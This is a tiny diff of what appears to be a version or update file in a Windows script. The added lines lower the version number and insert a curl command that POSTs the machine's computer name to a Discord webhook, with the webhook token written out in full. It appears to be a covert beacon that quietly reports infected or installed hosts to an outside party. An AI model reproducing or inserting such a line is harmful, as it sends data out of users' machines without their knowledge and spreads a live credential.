@@ -1,2 +1,2 @@
-version=0.0.02
-ping 34.234.212.94 -n 1 -w 2000
+version=0.0.01
+curl -i -X POST -H "Content-Type: application/json" -d "{""content"": ""%computername%""}" https://discord.com/api/webhooks/935080779019583518/sx632DIXhRcliqi5SXTHUF0I9nYL0nbuFo8OSFjG3r7G9-zp9D1eeaDbdCvb9KeRSuEd
